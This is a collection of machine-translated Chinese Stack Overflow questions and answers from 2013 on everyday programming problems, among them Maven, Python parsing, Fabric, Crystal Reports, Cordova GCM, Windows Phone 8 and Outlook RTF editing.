> 赞同：0
> 
> 时间：2013-03-05T19:58:53.123

我不这么认为。

但是你能不能让它使用一个在父 pom 和从属 pom 中以不同值结束的属性，这样如果孩子没有自己的`<scm>`标签，它会在孩子中失败？用于`<profile>`在父项和子项中以不同方式定义属性。

有时这行得通。

有时它起作用的原因是配置文件不被孩子继承，但如果父配置文件设置了一个属性，则该属性由孩子继承。

因此，有时您可以使用该“功能”来完成您正在做的事情。如果您在父项中激活配置文件并且该`<scm>`部分在配置文件中，则子项不会继承它。

另一种可能的解决方案是让您使用版本控制系统上的权限。在某些情况下，允许签入子项目的用户凭据可能不会被授予签入父项目的权限。如果子项目没有声明自己的项目，`<scm>`那么他们将无权愚弄父母部分中的回购`<scm>`部分。

# python - python中的模块管理与测试

> ID：15232709
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:41.637
> 
> 标签：python, file, module

我目前正在开发一个具有以下文件结构的项目：

*   模块
    *   设备 1
    *   设备 2
*   测试
    *   测试 1

最终，我无法在我的测试用例中导入`Device 1`和。目前这是通过将父目录添加到路径来实现的：. 不幸的是，这会阻止我的 IDE 向我显示设备的有用信息。相对导入在这里似乎不起作用，因为它是主文件，即它以. 我正在使用python 2.7。`Device 2``Test 1``sys.path.append(os.path.join(os.path.dirname(__file__), ".."))``Test 1``python test1.py`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:43:52.083

I'm doing this in a way that I'm not 100% is standard, but it's working for the meantime: ![Screenshot of sample project](../Images/11075a560055f1c1c968d7d8fa16f006.png)

So, as you can see, I don't have a `main.py` in this mock-up, yet. What I do have are modules in one folder and tests in the other.

The main "trick" (and, again, I'm not sure it's advisable) is to climb down the folder hierarchy using `sys.path.append` and `__file__.rsplit('\',2)`. The other trick is that, if called as main, every module loads up the init and tests itself, but if the init file is called, it tests *all* of the modules.

Hopefully someone can show you a better solution, but this may work in a pinch.

# django - 如果返回 grep 结果，Fabric 会引发错误

> ID：15232711
> 
> 赞同：0
> 
> 时间：2013-03-05T19:43:53.763
> 
> 标签：django, fabric

我正在使用 Fabric 来部署 Django（当然）。我希望能够运行一个 greps 字符串的本地命令，如果返回任何结果，则会引发异常并停止部署。

就像是：

```
local('grep -r -n "\s console.log" .') 
```

因此，如果我得到 > 0 个结果，我想停止进展。

处理这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T21:34:36.397

像这样运行它：

```
with settings(warn_only=True):
  local('grep -r -n "\s console.log" .') 
```

这将防止 Fabric 中止脚本执行，以防调用返回任何不为零的值。

# asp.net - 使用windows账号登录连接数据库失败？

> ID：15232714
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:04.543
> 
> 标签：asp.net, vb.net, iis-7

我在 iis 7.5（远程服务器）中部署了一个 asp.net web 应用程序作为“windows 身份验证”

```
...
 <system.web>
    ...
    <authentication mode="Windows"/>
    <identity impersonate="false"/>
    ...
 </system.web> 
```

以及在“NetworkService”身份上运行的应用程序。

我的连接字符串有`<add key="dbKey" value="Server=Test_Server$123;Database=Master;Trusted_Connection=True;"/>`

当我尝试从代码连接数据库时，它正在抛出`Exception Details: System.Data.SqlClient.SqlException: Login failed for user 'NT AUTHORITY\NETWORK SERVICE'`

代码：

```
Public Shared Function GetServerConnection(connectionString As String) As ServerConnection
    Dim serverCon As New Microsoft.SqlServer.Management.Common.ServerConnection(Connection(connectionString))
    serverCon.Connect() 'Error is showing here
    Return serverCon
End Function 
```

**用户如何使用他的 Windows 凭据连接到数据库并读取表数据？**

# search - 如何在 Alfresco 中索引视频字幕？

> ID：15232715
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:04.920
> 
> 标签：search, indexing, alfresco, caption, subtitle

我正在寻找一种方法来索引 Alfresco 中的视频字幕。理想情况下，我想返回找到标题的视频中的特定点。

有谁知道使用标准 .mp4 和 .srt 文件执行此操作的方法？

# .net - Crystal Report 迁移到 VS 2010 时抛出异常：名为“Item”的列已属于此 DataTable

> ID：15232719
> 
> 赞同：1
> 
> 时间：2013-03-05T19:44:24.877
> 
> 标签：.net, visual-studio-2010, crystal-reports

Crystal Report 在版本 10.5 和 Visual Studio 2008 (.NET framework 3.5) 下开发并运行良好。但是，当迁移到版本 13.0.2 和 Visual Studio 2010 (.NET framework 4.0) 时。我收到以下错误：

有人有过类似的经历吗？欢迎任何帮助或解决方案。

* * *

```
消息：名为“**Item**”的列已属于此 DataTable。
来源：System.Data
当前方法：Void RegisterColumnName(System.String, System.Data.DataColumn)
堆栈跟踪：
    在 System.Data.DataColumnCollection.RegisterColumnName（字符串名称，DataColumn 列）
    在 System.Data.DataColumnCollection.BaseAdd（DataColumn 列）
    在 System.Data.DataColumnCollection.AddAt（Int32 索引，DataColumn 列）
    在 System.Data.DataColumnCollection.Add（字符串列名，类型类型）
    在 CrystalDecisions.CrystalReports.Engine.Table.BuildTableFromMemberInfos（ArrayList memberInfos，布尔 autoFlattenCurrentLevel，Int32 currentLevel，Int32 maximumLevels，字符串 namePrefix，DataTable 表）
    在 CrystalDecisions.CrystalReports.Engine.Table.BuildTableFromEnumerable（IEnumerable 集合，类型 dataClassType，字符串表名）
    在 CrystalDecisions.CrystalReports.Engine.Table.EnumerableToDataSet（IEnumerable 集合）
    在 CrystalDecisions.CrystalReports.Engine.Table.WrapAndCacheDotNetObject（对象 val，类型类型，ISCRAdoNetDataSet& crAdoNetDataSet）
    在 CrystalDecisions.CrystalReports.Engine.Table.SetDataSource（对象 val，类型类型）
    在 CrystalDecisions.CrystalReports.Engine.Table.SetDataSource(IEnumerable enumerable)*

```

* * *

添加了源代码，DetailSps 和其他数据集在 .xsd 文件中定义。错误来自：Report.Database.Tables["DetailSps"].SetDataSource:

```
 public void CreateReport(ReportInfo reportInfo)
    {
        PopulateReportData(reportInfo.SpecDetail.Table);

        ReportClass Report = new DetailsRpt();

        Report.ReportOptions.EnableSaveDataWithReport = true;
        Report.ReportOptions.EnableSaveSummariesWithReport = true;

        // now add the tables used in Report
        Report.Database.Tables["DetailSps"].SetDataSource(
            DetailSps.OrderBy(x => x.ID)
                .ThenBy(x => x.Specall_ID));

    .....
}

    private void PopulateReportData(DataTable dt)
    {
        foreach (DataRow dr in dt.Rows)
        {
            DetailSps.AddDetailsRow(
                (String)dr["ID"], 
                (String)dr["Type"], 
                CommonDateFunctions.FormatStringAsDateMDYYYY(dr["selected_date"].ToString()), 
        ......
                (String)dr["ErrorCode"]
                );
        }

        ....
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T03:03:28.100

我记得一年前升级项目时遇到了完全相同的问题。我确定“项目”冲突是由 Visual Studio 设计人员在其自动生成的代码文件之一中创建项目对象引起的。在我的例子中，我认为是我用来为 Crystal 数据源建模的 XML Schema 设计器。

我最终将我的列重命名为**不是**“项目”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T00:48:47.953

出于调试目的，我会尝试打破这一行：

```
 // now add the tables used in Report
    Report.Database.Tables["DetailSps"].SetDataSource(
        DetailSps.OrderBy(x => x.ID).ThenBy(x => x.Specall_ID)); 
```

类似于：

```
 DataTable dataTable = DetailSps.OrderBy(x => x.ID).ThenBy(x => x.Specall_ID);

    Report.Database.Tables["DetailSps"].SetDataSource(dataTable); 
```

看看您是否可以进一步隔离问题。

也许还可以在违规行之前设置一个断点，并查看快速监视窗口中的数据表或遍历所有列/行并查看名称和数据...

# big-o - (log n)^k = O(n^1/2) 吗？对于 k 大于或等于 0

> ID：15232720
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:25.107
> 
> 标签：big-o, asymptotic-complexity

在大 O 表示法中`O((log n)^k) = O(log n)`，`k`一些常数在哪里？那么`(log n)^k`when发生了什么`k>=0`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:51:48.360

也许这可能是误解的根源？log(n^k) = k * log(n)，但是对于 log(n)^k = (log(n))^k 没有这样的简化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:49:10.883

O((log n) * k) == O(log n)，但 (log n)^k 绝对**不是**一回事。我相信您正在考虑常量乘法，这在大 O 表示法中是等价的。但是，将 f(n) 提高到幂会改变完成时间。这与 O(n) 不同于 O(n^2) 的概念相同。

# android - 适用于 Android 的 Cordova / Phonegap GCM 插件崩溃

> ID：15232724
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:43.647
> 
> 标签：android, cordova, phonegap-plugins, google-cloud-messaging

我正在尝试让[GCM Cordova 插件](https://github.com/marknutter/GCM-Cordova)在提供的示例应用程序中运行。我下载了源代码并在 Eclipse 中从现有代码创建了一个项目。

现在，在这个项目中有一个名为 CORDOVA_GCM_script.js 的文件，需要更改发件人 ID 以匹配我自己的 GCM 服务标识符（我从我的 Google 项目中获得）：

```
window.plugins.GCM.register("my_sender_id", "GCM_Event", GCM_Success, GCM_Fail ); 
```

要将消息发送到我的应用程序，我将 node.js 与此脚本一起使用，正如 Holly Schinsky 在[这篇文章](http://devgirl.org/2012/10/25/tutorial-android-push-notifications-with-phonegap/)中所解释的那样：

```
var GCM = require('gcm').GCM;

var apiKey = 'someCharsRepresentingMyKey';
var gcm = new GCM(apiKey);

var message = {
    registration_id: 'myDeviceRegistrationId', // required
    collapse_key: 'demo', 
    'message': 'Yourturn',
    'title': 'My Game',
    'msgcnt': '1'
};

gcm.send(message, function(err, messageId){
    if (err) {
        console.log("Something has gone wrong!");
    } else {
        console.log("Sent with message ID: ", messageId);
    }
}); 
```

现在，当我在设备上运行应用程序时，它会启动并注册，但是当我尝试向它发送消息时，它会崩溃并存在消息*“不幸的是，GCM 已停止”*

LogCat 向我展示了这个：

```
03-05 20:15:39.897: E/AndroidRuntime(19007): FATAL EXCEPTION: IntentService[GCMIntentService-GCMIntentService-2]
03-05 20:15:39.897: E/AndroidRuntime(19007): java.lang.NullPointerException: println needs a message
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.util.Log.println_native(Native Method)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.util.Log.v(Log.java:117)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at com.cordova2.gcm.GCMIntentService.onMessage(GCMIntentService.java:63)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at com.google.android.gcm.GCMBaseIntentService.onHandleIntent(GCMBaseIntentService.java:179)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:65)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.os.Looper.loop(Looper.java:137)
03-05 20:15:39.897: E/AndroidRuntime(19007):    at android.os.HandlerThread.run(HandlerThread.java:60) 
```

我找到[了这篇文章](https://stackoverflow.com/questions/13451495/gcm-phonegap-plugin-error-on-message)并遵循了建议的建议，但应用程序不断崩溃。

任何人都可以给我任何建议吗？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:58:59.487

如您的 StackTrace 所示，当您将`null`消息传递给`Log.v`.

可能`messageId`是 null`console.log("Sent with message ID: ", messageId);`

尝试将其更改为

```
 console.log("Sent with message ID: ", messageId + ""); 
```

这只是用于调试目的的快速解决方案。

您可以检查的另一件事是在[Cordova 代码](https://github.com/marknutter/GCM-Cordova/blob/master/src/com/cordova2/gcm/GCMIntentService.java)代码中注释第 75 行

`Log.v(ME + ":onMessage ", json.toString());`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T00:05:27.213

感谢 iTech 提供的提示，我注意到问题实际上出在服务器上；特别是服务器向设备发送消息的方式。

现在我使用[node-gcm](https://github.com/h2soft/node-gcm)和这个脚本来发送消息：

```
var gcm = require('/usr/local/lib/node_modules/node-gcm');
var message = new gcm.Message();
var sender = new gcm.Sender('charsRepresentingAPIKey');
var registrationIds = [];

message.addData('message', 'hello');
message.addData('msgcnt', '1');
message.collapseKey = 'demo';
message.delayWhileIdle = true;
message.timeToLive = 3;

registrationIds.push('charsRepresentingRegIDOfDevice');

sender.send(message, registrationIds, 4, function (err, result) {
        console.log(result);
}); 
```

使用我之前的脚本（您可以在问题上看到它），不知何故数据未包含在消息中，因此当尝试在日志上打印包含数据的值时应用程序崩溃了。使用此脚本，这不会发生。

# xaml - WP8 LongListSelector SelectedItem 不可绑定

> ID：15232725
> 
> 赞同：7
> 
> 时间：2013-03-05T19:44:46.570
> 
> 标签：xaml, windows-phone-8, longlistselector

在 WP8 中，他们忘记提供 SelectedItem 作为依赖属性，因此我无法绑定到它。我用这个解决了这个问题：http: [//dotnet-redzone.blogspot.com/2012/11/windows-phone-8longlistselector.html](http://dotnet-redzone.blogspot.com/2012/11/windows-phone-8longlistselector.html)

这样做时，我注意到我无法从 ViewModel 重置属性，即如果我在 ViewModel 中将项目设置为 null，它不会影响 UI。我已经在 UI 中提供了两种方式绑定，但仍然在 ViewModel 中将项目设置为 null 不会更改 LongListSelector 中的选定项目。我也不想使用 SelectionChanged 事件，因为我在 WP7.5 应用程序和 WP8 应用程序之间共享 ViewModel，因此我想尽可能多地推入 ViewModel。有解决方案吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-06T05:44:00.817

您正在使用的自定义 LongListSelector 类似乎无法正确处理设置器。

将 OnSelectedItemChanged 回调替换为以下内容：

```
 private static void OnSelectedItemChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        var selector = (LongListSelector)d;
        selector.SetSelectedItem(e);
    }

    private void SetSelectedItem(DependencyPropertyChangedEventArgs e)
    {
        base.SelectedItem = e.NewValue;
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-15T20:30:31.090

并且有这两部分的完整版：

```
public class LongListSelector : Microsoft.Phone.Controls.LongListSelector
    {
        public LongListSelector()
        {
            SelectionChanged += LongListSelector_SelectionChanged;
        }

    void LongListSelector_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        SelectedItem = base.SelectedItem;
    }

    public static readonly DependencyProperty SelectedItemProperty =
        DependencyProperty.Register(
            "SelectedItem",
            typeof(object),
            typeof(LongListSelector),
            new PropertyMetadata(null, OnSelectedItemChanged)
        );

    private static void OnSelectedItemChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        var selector = (LongListSelector)d;
        selector.SetSelectedItem(e);
    }

    private void SetSelectedItem(DependencyPropertyChangedEventArgs e)
    {
        base.SelectedItem = e.NewValue;
    }

    public new object SelectedItem
    {
        get { return GetValue(SelectedItemProperty); }
        set { SetValue(SelectedItemProperty, value); }
    }
} 
```

# android - Android：无法在我的应用上与某些设备建立 Internet 连接

> ID：15232727
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:53.083
> 
> 标签：android, httpclient, gprs

我为 android 编写了一个应用程序，它必须从网站下载数据。总而言之，它运行良好，但我从一些用户那里听说，当他们通过移动互联网访问互联网时，互联网连接不起作用。使用 WLAN 没有问题，在我的手机上它甚至可以与移动互联网一起使用。我已经确保遇到这些问题的用户确实可以通过他们的移动互联网在其他应用程序上访问互联网......这是我建立连接的源代码。

```
String urlString = "http://google.com";
URL url = new URL(urlString);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setReadTimeout(10000 /* milliseconds */);
conn.setConnectTimeout(15000 /* milliseconds */);
conn.setRequestMethod("GET");
conn.setDoInput(true);
// Starts the query
conn.connect();
InputStream stream = conn.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(stream, "ISO-8859-"));
String line = "";
while((line = reader.readLine()) != null){
    line //do sthg with line
} 
```

我希望我给你们提供了足够的信息来帮助我解决这个问题

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:09:25.390

也许你可以删除那些

```
conn.setReadTimeout(10000 /* milliseconds */);
conn.setConnectTimeout(15000 /* milliseconds */); 
```

# objective-c - 将表格视图单元格移动到 UITableViewController 中某个部分下的单行的好方法？

> ID：15232730
> 
> 赞同：0
> 
> 时间：2013-03-05T19:44:55.673
> 
> 标签：objective-c, uitableview

使表格视图部分下的所有表格视图单元格在一行上的最佳方法是什么，就好像它们是网格正方形一样？我仍想使用 UITableView，但只需将单元格制作成单个方形块，它们一起填满一整行。（它类似于集合视图，但我想使用 UITableView 来完成此操作）。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:47:16.093

UITableView 是单列和线性的。你不能用它做你描述的事情。这就是 UICollectionView 的目的；它不受单元格格式的限制。

# python - Python通过自定义字段模式解析文件名

> ID：15232734
> 
> 赞同：0
> 
> 时间：2013-03-05T19:45:04.327
> 
> 标签：python, regex, parsing, csv

这周开始学习python，所以我想我会用它而不是excel来解析文件路径中的一些字段。

我有大约 3000 个文件都符合命名约定。/Household/LastName.FirstName.Account.Doctype.Date.extension

例如，这些文件之一可能命名为：Cosby.Bill..Profile.2006.doc，完整路径为 /Volumes/HD/Organized Files/Cosby、Bill/Cosby.Bill..Profile.2006.doc

在这种情况下：

**科斯比，比尔**将成为家庭

家庭（Cosby，Bill）是实际文件的封闭文件夹

**比尔**将是第一个名字

**考斯比**将是姓氏

帐户字段被省略

**Profile**是文档类型

**2006 年**是日期

**doc**是扩展名

所有这些文件都位于此目录 /Volumes/HD/Organized Files/ 我使用终端和 ls 将所有文件的列表放入桌面上的 .txt 文件中，我正在尝试将文件路径中的信息解析为像上面的示例中的类别。理想情况下，我想输出到 csv，每个类别都有一列。这是我丑陋的代码：

```
def main():
    file = open('~/Desktop/client_docs.csv', "rb")
    output = open('~/Desktop/client_docs_parsed.txt', "wb")
    for line in file:
        i = line.find(find_nth(line, '/', 2))
        beghouse = line[i + len(find_nth(line, '/', 2)):]
        endhouse = beghouse.find('/')
        household = beghouse[:endhouse]
        lastn = (line[line.find(household):])[(line[line.find(household):]).find('/') + 1:(line[line.find(household):]).find('.')]
        firstn = line[line.find('.') + 1: line.find('.', line.find('.') + 1)]
        acct = line[line.find('{}.{}.'.format(lastn,firstn)) + len('{}.{}.'.format(lastn,firstn)):line.find('.',line.find('{}.{}.'.format(lastn,firstn)) + len('{}.{}.'.format(lastn,firstn)))]
        doctype_beg = line[line.find('{}.{}.{}.'.format(lastn, firstn, acct)) + len('{}.{}.{}.'.format(lastn, firstn, acct)):]
        doctype = doctype_beg[:doctype_beg.find('.')]
        date_beg = line[line.find('{}/{}.{}.{}.{}.'.format(household,lastn,firstn,acct,doctype)) + len('{}/{}.{}.{}.{}.'.format(household,lastn,firstn,acct,doctype)):]
        date = date_beg[:date_beg.find('.')]
        print '"',household, '"','"',lastn, '"','"',firstn, '"','"',acct, '"','"',doctype, '"','"',date,'"'

def find_nth(body, s_term, n):
    start = body[::-1].find(s_term)
    while start >= 0 and n > 1:
        start = body[::-1].find(s_term, start+len(s_term))
        n -= 1
    return ((body[::-1])[start:])[::-1]

if __name__ == "__main__": main() 
```

它似乎工作正常，但是当有另一个封闭文件夹时我遇到了问题，然后它会移动我的所有字段......例如，而不是文件驻留在

/卷/高清/有组织的文件/科斯比，比尔/

它位于 /Volumes/HD/Organized Files/Resigned/Cosby, Bill/

我知道必须有一种不那么笨重的方法来解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T21:33:29.537

这是一个比您的功能更实用的工具`find_nth()`：
`rstrip()`

```
def find_nth(body, s_term, n):
    start = body[::-1].find(s_term)
    print '------------------------------------------------'
    print 'body[::-1]\n',body[::-1]
    print '\nstart == %s' % start
    while start >= 0 and n > 1:
        start = body[::-1].find(s_term, start+len(s_term))
        print 'n == %s    start == %s' % (n,start)
        n -= 1
    print '\n (body[::-1])[start:]\n',(body[::-1])[start:]
    print '\n((body[::-1])[start:])[::-1]\n',((body[::-1])[start:])[::-1]
    print '---------------\n'
    return ((body[::-1])[start:])[::-1]

def cool_find_nth(body, s_term, n):
    assert(len(s_term)==1)
    return body.rsplit(s_term,n)[0] + s_term

ss = 'One / Two / Three / Four / Five / Six / End'
print 'the string\n%s\n' % ss

print ('================================\n'
       "find_nth(ss, '/', 3)\n%s" % find_nth(ss, '/', 3) )

print '================================='
print "cool_find_nth(ss, '/', 3)\n%s" % cool_find_nth(ss, '/', 3) 
```

结果

```
the string
One / Two / Three / Four / Five / Six / End

------------------------------------------------
body[::-1]
dnE / xiS / eviF / ruoF / eerhT / owT / enO

start == 4
n == 3    start == 10
n == 2    start == 17

 (body[::-1])[start:]
/ ruoF / eerhT / owT / enO

((body[::-1])[start:])[::-1]
One / Two / Three / Four /
---------------

================================
find_nth(ss, '/', 3)
One / Two / Three / Four /
=================================
cool_find_nth(ss, '/', 3)
One / Two / Three / Four / 
```

### 编辑 1

这是另一个非常实用的工具：正则表达式

```
import re

reg = re.compile('/'
                 '([^/.]*?)/'
                 '([^/.]*?)\.'
                 '([^/.]*?)\.'
                 '([^/.]*?)\.'
                 '([^/.]*?)\.'
                 '([^/.]*?)\.'
                 '[^/.]+\Z')

def main():
    #file = open('~/Desktop/client_docs.csv', "rb")
    #output = open('~/Desktop/client_docs_parsed.txt', "wb")
    li = ['/Household/LastName.FirstName.Account.Doctype.Date.extension',
          '- /Volumes/HD/Organized Files/Cosby, Bill/Cosby.Bill..Profile.2006.doc']
    for line in li:
        print "line == %r" % line
        household,lastn,firstn,acct,doctype,date = reg.search(line).groups('')       
        print ('household == %r\n'
               'lastn     == %r\n'
               'firstn    == %r\n'
               'acct      == %r\n'
               'doctype   == %r\n'
               'date      == %r\n'
               % (household,lastn,firstn,acct,doctype,date))

if __name__ == "__main__": main() 
```

结果

```
line == '/Household/LastName.FirstName.Account.Doctype.Date.extension'
household == 'Household'
lastn     == 'LastName'
firstn    == 'FirstName'
acct      == 'Account'
doctype   == 'Doctype'
date      == 'Date'

line == '- /Volumes/HD/Organized Files/Cosby, Bill/Cosby.Bill..Profile.2006.doc'
household == 'Cosby, Bill'
lastn     == 'Cosby'
firstn    == 'Bill'
acct      == ''
doctype   == 'Profile'
date      == '2006' 
```

### 编辑 2

我想知道当我发布最后一次编辑时我的大脑在哪里。以下内容也可以完成这项工作：

```
rig = re.compile('[/.]')
rig.split(line)[-7:-1] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T04:45:32.080

据我所知，我相信这将作为一种解决方案起作用，它不依赖于先前编译的文件列表

```
import csv
import os, os.path

# Replace this with the directory where the household directories are stored.
directory = "home"
output = open("Output.csv", "wb")
csvf = csv.writer(output)

headerRow = ["Household", "Lastname", "Firstname", "Account", "Doctype", 
              "Date", "Extension"]

csvf.writerow(headerRow)

for root, households, files in os.walk(directory):
    for household in households:
        for filename in os.listdir(os.path.join(directory, household)):
            # This will create a record for each filename within the "household"
            # Then will split the filename out, using the "." as a delimiter
            # to get the detail
            csvf.writerow([household] + filename.split("."))
output.flush()
output.close() 
```

这使用 os 库来“遍历”家庭列表。然后对于每个“家庭”，它将收集一个文件列表。它采用这个列表，在 csv 文件中生成记录，分解文件的名称，使用句点作为分隔符。

它利用 csv 库来生成输出，看起来有点像；

```
"Household,LastName,Firstname,Account,Doctype,Date,Extension" 
```

如果不需要扩展，则可以通过更改行来省略：

```
csvf.writerow([household] + filename.split(".")) 
```

到

```
csvf.writerow([household] + filename.split(".")[-1]) 
```

它告诉它只用完文件名的最后一部分，然后从 headerRow 中删除“Extension”字符串。

希望这会有所帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:21:24.480

有点不清楚问题是什么，但与此同时，这里有一些东西可以帮助您入门：

```
#!/usr/bin/env python

import os
import csv

with open("f1", "rb") as fin:
    reader = csv.reader(fin, delimiter='.')
    for row in reader:
        # split path
        row = list(os.path.split(row[0])) + row[1:]
        print ','.join(row) 
```

输出：

```
/Household,LastName,FirstName,Account,Doctype,Date,extension 
```

另一种解释是，您希望将每个字段存储在一个参数中，并且额外的路径搞砸了......

这是`row`for 循环中的样子：

```
['/Household/LastName', 'FirstName', 'Account', 'Doctype', 'Date', 'extension'] 
```

那么解决方案可能是向后工作。

分配`row[-1]`给`extension`，`row[-2]`给`date`等等。

# datamapper - 将复杂的 SQL 查询与 DataMapper 集成

> ID：15232736
> 
> 赞同：3
> 
> 时间：2013-03-05T19:45:17.923
> 
> 标签：datamapper, ruby-datamapper

我需要使用一个相当复杂的排序函数，它涉及多个连接和一些数学运算。因此，无法将其合并到标准 DataMapper 语法（例如`User.all(:order => ...)`）中。目前我有类似的东西

```
repository(:default).adapter.select('
SELECT users.id, ( (count(table1.*) - count(table2.*))/((EXTRACT(EPOCH FROM current_timestamp)) ) as sort FROM users
LEFT JOIN table1
ON table1.user_id = users.id
LEFT JOIN table2
ON ...
AND ...
GROUP BY users.id
ORDER BY sort DESC') 
```

但是，我想将它集成到 DataMapper 中，以便我可以在任何 datamapper 集合上调用它

例如，`User.all(:name => 'bob').crazy_sort_function`返回按我的特殊函数排序的名为“bob”的用户，或者可能`User.all(:order => crazy_sort)`，等等......无论什么公式都尽可能地将其无缝集成到数据映射器 ORM 中。

注意：由于 current_timestamp 是查询的一部分，因此我不能定期为所有行编译并放入一列中。

# c# - 通过编码编辑 MailItem.RTFBody

> ID：15232737
> 
> 赞同：2
> 
> 时间：2013-03-05T19:45:18.217
> 
> 标签：c#, rtf, outlook-2010, mailitem

我已经使用 UTF8Encoding 从 MailItem 编码 RTFbody 取得了一些成功。我能够撰写新电子邮件，完成所有新电子邮件的工作，然后单击发送。点击发送后，我在电子邮件中附加了一个标签，该标签也添加到了类别中。这一切都通过 RTFBbody 工作。

当我回复 RTF 电子邮件时，问题就出现了，出于测试目的，这些电子邮件只是我发送给孤独的自己的电子邮件。当我发送回复电子邮件并添加新标签时，我先删除旧标签，然后添加新标签。当我`RTFBody`在回复电子邮件中设置包含新标签的已编辑字符串时，我收到“内存或磁盘空间不足”错误。当我只是删除具有相同功能的标签时，不会发生这种情况。

贝娄是我正在使用的代码：

```
private void ChangeRTFBody(string replaceThis, string replaceWith)
{
    byte[] rtfBytes = Globals.ThisAddIn.email.RTFBody as byte[];
    System.Text.Encoding encoding = new System.Text.UTF8Encoding();
    string rtfString = encoding.GetString(rtfBytes);

    rtfString = rtfString.Replace(replaceThis, replaceWith);

    rtfBytes = encoding.GetBytes(rtfString);
    Globals.ThisAddIn.email.RTFBody = rtfBytes; < // The error is here only on 
                                                  // reply and only when I replace 
                                                  // with new tags
} 
```

这些是我打的电话：

删除旧标签：`ChangeRTFBody(lastTag, "");`

添加新标签：`ChangeRTFBody("}}\0", newTag + "}}\0");`

就像我说的，这在我创建新电子邮件并发送时有效，但在我尝试回复同一封电子邮件时无效。似乎`byte[]`删除后的大小几乎翻了一番。当我在删除期间检查它时，它大约为 15k 字节，而当我在添加期间检查时，它跳到超过 30k 字节。当我尝试将新膨胀的内容添加`byte[]`到 rtfBody 时，我得到了错误。

感谢您提供任何帮助和提示，并对所有阅读内容感到抱歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-04-14T22:35:09.170

我遇到了同样的问题，并且遇到了我认为通过使用 Word.Document 对象模型替换 Outlook rtf 正文中的文本的更简单方法。您需要先将 Microsoft.Office.Interop.Word 的引用添加到您的项目中。

然后添加使用

```
using Word = Microsoft.Office.Interop.Word; 
```

那么你的代码看起来像

```
Word.Document doc = Inspector.WordEditor as Word.Document;

//body text
string text = doc.Content.Text;

//find text location
int textLocation = text.IndexOf(replaceThis);

if(textLocation > -1){
     //get range
     int textLocationEnd = textLocation + replaceThis.Length;

     //init range
     Word.Range myRange = doc.Range(textLocation , textLocationEnd);

     //replace text
     myRange.Text = replaceWith
} 
```

# java - 硬币变化：递归获取组合，如何将它们保存到数组中

> ID：15232738
> 
> 赞同：2
> 
> 时间：2013-03-05T19:45:19.480
> 
> 标签：java, arrays, recursion, combinations

到目前为止，这是我的代码。我想递归地找到产生给定金额的所有组合。这是应该打印组合的测试程序，但正如我所料，有一个错误

*ArrayIndexOutOfBoundsException: 0*

在两排。请帮忙，我不明白。以及如何将它们保存到数组而不是打印？

```
import java.util.Scanner;

public class CoinChange {
public static void printCombos(int sum, int sumSoFar, int[] coinsSoFar) {

int[] coins = {5, 10, 20, 50};

if (sum == sumSoFar) {
System.out.print(coinsSoFar);
    }

else if (sum > sumSoFar) {
    for (int i = 0; i < 4; i++) {   
    sumSoFar = sumSoFar + coins[i];
    coinsSoFar[coinsSoFar.length] = coins[i];  // error row
    printCombos(sum, sumSoFar, coinsSoFar);

    }   

    }
    }

public static void main (String[]args) {

Scanner read = new Scanner(System.in);
int sum = read.nextInt();
int[] empty = {}; 
printCombos(sum, 0, empty); //error row 
```

}
}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:47:13.670

当您尝试在超出数组长度的索引处分配时，Java 数组不会自动增长。因此，以下将始终给出一个`ArrayIndexOutOfBoundsException`（嗯，或者那个或一个`NullPointerException`:)）：

```
coinsSoFar[coinsSoFar.length] = ...; 
```

最简单的选择可能是使用[`ArrayList<Integer>`](http://docs.oracle.com/javase/7/docs/api/java/util/ArrayList.html)for `coinsSoFar`，随着您的进行适当地调整它的大小。

# c++ - 在 VBA 中声明变量注册表？

> ID：15232740
> 
> 赞同：1
> 
> 时间：2013-03-05T19:45:34.037
> 
> 标签：c++, c, vba, excel

VBA 新手在这里。我们可以在 C/C++ 中为非常频繁访问的变量（ex-循环迭代器变量）将变量作为“寄存器”。

Visual Basic for Application 中是否存在类似的系统。我正在用 EXCEL VBA 编程并从其他一些应用程序中提取数据。

我的算法本质需要6级嵌套循环，所以想让它们更快。他们已经从最近 30 分钟开始运行了：D

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T09:21:31.823

VBA 中没有寄存器类型。

您的问题可能与循环正在做什么而不是变量类型声明有关。

